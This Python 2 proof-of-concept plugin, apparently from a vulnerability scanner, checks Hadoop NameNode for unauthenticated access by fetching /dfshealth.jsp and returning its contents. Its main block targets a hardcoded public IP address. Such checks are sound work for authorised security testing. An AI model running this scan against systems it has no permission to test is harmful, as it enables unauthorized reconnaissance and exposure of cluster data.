#!/usr/bin/env python
# encoding: utf-8
"""
POC Name  : hadoop 未授权访问
Author    : gzh
Referer   : https://www.secpulse.com/archives/49115.html
"""

from ..t import T

import requests,urllib2,json,urlparse
from termcolor import cprint

class P(T):
    def __init__(self):
        T.__init__(self)

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        target_url = "http://"+ip+":"+port+"/dfshealth.jsp"
        result = {}
        result['result']=False
        r=None
        try:
            r = requests.get(url=target_url,timeout=2)

            if r.status_code==200:
                cprint(target_url+'存在hadoop unac漏洞', 'red')
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='hadoop unauthority.'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']='IP:port/dfshealth.jsp'
                result['VerifyInfo']['result'] =r.text
                result['VerifyInfo']['level'] = '高危(HOLE)'
            else:
                pass
        except Exception,e:
            print e.text
        finally:
            if r is not None:
                r.close()
                del r
            return result

if __name__ == '__main__':
	print P().verify(ip='42.120.7.120',port='50070')
